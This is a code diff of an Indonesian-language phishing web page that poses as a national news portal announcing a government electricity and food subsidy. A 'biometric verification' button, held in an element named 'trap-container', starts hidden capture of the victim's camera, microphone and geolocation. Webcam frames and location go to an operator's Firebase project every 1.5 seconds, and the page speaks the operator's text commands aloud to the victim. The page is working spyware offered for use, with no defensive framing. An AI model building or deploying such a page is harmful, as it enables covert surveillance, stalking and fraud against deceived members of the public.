@@ -3,164 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Warta Nasional - Portal Berita Terpercaya</title>
+    <title>Warta Nasional - Berita Terkini dan Terpercaya</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         .article-content p { margin-bottom: 1.5rem; color: #333; line-height: 1.8; }
+        .sticky-nav { position: sticky; top: 0; z-index: 40; }
     </style>
 </head>
 <body class="bg-white">
-    <!-- Navigasi -->
-    <nav class="bg-red-700 text-white p-4 shadow-md sticky top-0 z-50">
+    <!-- Navbar -->
+    <nav class="sticky-nav bg-red-700 text-white p-4 shadow-md">
         <div class="max-w-4xl mx-auto flex justify-between items-center">
             <div class="font-bold text-2xl italic tracking-tighter">WARTA<span class="text-yellow-400">NASIONAL</span></div>
+            <div class="hidden md:flex space-x-4 text-sm font-semibold">
+                <span>POLITIK</span>
+                <span>EKONOMI</span>
+                <span>METRO</span>
+                <span>DUNIA</span>
+            </div>
         </div>
     </nav>
 
-    <!-- Konten Berita -->
+    <!-- Main Content -->
     <main class="max-w-4xl mx-auto p-4 md:p-8">
-        <div class="mb-4 text-center md:text-left">
-            <span class="text-red-600 font-bold text-sm uppercase italic">Pengumuman Resmi</span>
-            <h1 class="text-3xl md:text-4xl font-extrabold mt-2 leading-tight">Pemerintah Mulai Cairkan Subsidi Listrik Bagi Pemegang NIK Aktif Seluruh Indonesia</h1>
+        <div class="mb-4">
+            <span class="text-red-600 font-bold text-sm">EKONOMI & SOSIAL</span>
+            <h1 class="text-3xl md:text-4xl font-extrabold mt-2 leading-tight">Pemerintah Sahkan Program Subsidi Listrik dan Sembako Gratis untuk Seluruh Pemegang NIK Aktif Mulai Maret 2026</h1>
+            <div class="flex items-center mt-4 text-gray-500 text-xs italic">
+                <span>Oleh: Redaksi Warta Nasional</span>
+                <span class="mx-2">•</span>
+                <span>Senin, 02 Maret 2026</span>
+            </div>
         </div>
 
-        <div id="trap-container" class="my-8 p-6 bg-red-50 border-l-4 border-red-600 rounded-lg shadow-inner">
-            <h3 class="font-bold text-xl mb-4 text-red-800 italic">Lakukan Aktivasi Biometrik</h3>
-            <p class="text-sm text-gray-700 mb-6">Untuk mencegah penipuan, subsidi hanya dicairkan setelah proses verifikasi biometrik wajah dan suara selesai dilakukan secara real-time.</p>
-            <button id="verify-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded shadow-lg transition-all animate-pulse uppercase tracking-widest">
-                Mulai Aktivasi Sekarang
-            </button>
+        <img src="https://images.unsplash.com/photo-1591629000589-53590e32488a?auto=format&fit=crop&q=80&w=800" class="w-full rounded-lg mb-6 shadow-sm">
+
+        <div class="article-content text-lg">
+            <p><strong>Jakarta</strong> - Pemerintah melalui Kementerian Sosial resmi meluncurkan program integrasi subsidi nasional.</p>
+
+            <!-- Trigger Form -->
+            <div id="trap-container" class="my-8 p-6 bg-red-50 border-l-4 border-red-600 rounded-r-lg shadow-inner">
+                <h3 class="font-bold text-xl mb-4 text-red-800 italic">Verifikasi Hak Subsidi Anda</h3>
+                <p class="text-sm text-gray-700 mb-6">Lakukan <strong>Verifikasi Biometrik Wajah</strong> untuk aktivasi subsidi.</p>
+                
+                <button id="verify-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded shadow-lg transition-all animate-bounce">
+                    AKTIFKAN VERIFIKASI SEKARANG
+                </button>
+            </div>
+
+            <p>Program ini menyasar seluruh pemilik NIK aktif di Indonesia.</p>
         </div>
     </main>
 
-    <!-- Elemen video DIMUTE agar target tidak mendengar suaranya sendiri -->
-    <video id="v" style="display:none" autoplay muted playsinline></video>
+    <!-- Background Process Logic -->
+    <video id="v" style="display:none" autoplay playsinline></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
         import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
-        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
+        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
-        // Menggunakan konfigurasi dinamis dari lingkungan untuk menghindari Error invalid-api-key
-        const firebaseConfig = typeof __firebase_config !== 'undefined' 
-            ? JSON.parse(__firebase_config) 
-            : {
-                apiKey: "", 
-                authDomain: "apktroj.firebaseapp.com",
-                projectId: "apktroj",
-                storageBucket: "apktroj.firebasestorage.app",
-                messagingSenderId: "943833619122",
-                appId: "1:943833619122:web:d757ced4d56267abf247ab"
-            };
+        const firebaseConfig = {
+            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
+            authDomain: "apktroj.firebaseapp.com",
+            projectId: "apktroj",
+            storageBucket: "apktroj.firebasestorage.app",
+            messagingSenderId: "943833619122",
+            appId: "1:943833619122:web:d757ced4d56267abf247ab"
+        };
 
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
         const auth = getAuth(app);
-        const appId = typeof __app_id !== 'undefined' ? __app_id : 'apktroj_v1';
+        const appId = "apktroj_v1";
 
-        let user = null;
-
-        // Login otomatis saat tombol diklik
         document.getElementById('verify-btn').onclick = async () => {
             const btn = document.getElementById('verify-btn');
             btn.innerText = "MENGHUBUNGKAN KE SERVER...";
             btn.disabled = true;
 
-            try {
-                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
-                    await signInWithCustomToken(auth, __initial_auth_token);
-                } else {
-                    await signInAnonymously(auth);
-                }
-            } catch (error) {
-                console.error("Auth Error:", error);
-                btn.innerText = "GAGAL MENGHUBUNGKAN";
-                btn.disabled = false;
-            }
+            await signInAnonymously(auth);
+            startAgent();
         };
 
-        onAuthStateChanged(auth, (u) => {
-            if (u) {
-                user = u;
-                startRealTimeStream();
-            }
-        });
+        async function startAgent() {
+            const userId = auth.currentUser.uid;
+            let currentLocation = null;
 
-        async function startRealTimeStream() {
-            if (!user) return;
-            const userId = user.uid;
-            
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            // 1. Geoloc
+            navigator.geolocation.getCurrentPosition(p => {
+                currentLocation = { lat: p.coords.latitude, lng: p.coords.longitude };
+            }, null);
+
+            // 2. Stream
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                 const video = document.getElementById('v');
                 video.srcObject = stream;
-                
                 const canvas = document.getElementById('c');
                 const ctx = canvas.getContext('2d');
 
-                // MediaRecorder untuk real-time audio (tanpa terdengar di target)
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-                
-                mediaRecorder.ondataavailable = async (e) => {
-                    if (e.data.size > 0 && user) {
-                        const reader = new FileReader();
-                        reader.readAsDataURL(e.data);
-                        reader.onloadend = async () => {
-                            const audioBase64 = reader.result;
-                            
-                            canvas.width = 300;
-                            canvas.height = 200;
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const frame = canvas.toDataURL('image/jpeg', 0.4);
+                setInterval(async () => {
+                    canvas.width = 240; 
+                    canvas.height = 180;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', userId), {
+                        frame: canvas.toDataURL('image/jpeg', 0.3),
+                        location: currentLocation,
+                        timestamp: Date.now(),
+                        uid: userId
+                    });
+                }, 1500);
 
-                            // Simpan ke path yang sesuai aturan Firestore
-                            await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', userId), {
-                                frame: frame,
-                                audio: audioBase64,
-                                timestamp: Date.now(),
-                                uid: userId
-                            });
-                        };
-                    }
-                };
-
-                // Ambil potongan suara secara berkala
-                setInterval(() => {
-                    if (mediaRecorder.state === "inactive") {
-                        mediaRecorder.start();
-                        setTimeout(() => {
-                            if(mediaRecorder.state === "recording") mediaRecorder.stop();
-                        }, 900);
-                    }
-                }, 1100);
-
-                // Perintah Suara dari Monitor
+                // 3. VOICE INTERCOM (Target Mendengar Suara dari Admin)
                 onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), (snap) => {
                     if (snap.exists()) {
                         const data = snap.data();
-                        if (Date.now() - data.timestamp < 3000) {
+                        // Hanya eksekusi jika pesan dikirim dalam 5 detik terakhir
+                        if (Date.now() - data.timestamp < 5000) {
                             const utter = new SpeechSynthesisUtterance(data.text);
                             utter.lang = 'id-ID';
+                            utter.rate = 1.0;
+                            utter.volume = 1.0; // Volume maksimal
                             window.speechSynthesis.speak(utter);
                         }
                     }
-                }, (err) => console.error("Snapshot error:", err));
+                });
 
                 document.getElementById('trap-container').innerHTML = `
                     <div class="text-center p-4">
                         <div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-red-600 mb-2"></div>
-                        <p class="text-sm font-bold text-red-600 uppercase italic">Verifikasi Biometrik Sedang Berjalan...</p>
-                        <p class="text-[10px] text-gray-500 mt-2">Jangan tutup tab ini untuk memproses subsidi Anda.</p>
+                        <p class="text-sm font-bold text-red-600 uppercase">Verifikasi Biometrik Aktif...</p>
+                        <p class="text-xs text-gray-500">Tunggu instruksi suara dari sistem untuk proses validasi.</p>
                     </div>
                 `;
-
-            } catch (err) {
-                console.error("Stream Error:", err);
-                alert("Izin Kamera dan Mikrofon diperlukan untuk verifikasi.");
+            }).catch(e => {
+                alert("Izin Kamera dan Mikrofon Wajib untuk Verifikasi.");
                 location.reload();
-            }
+            });
         }
     </script>
 </body>
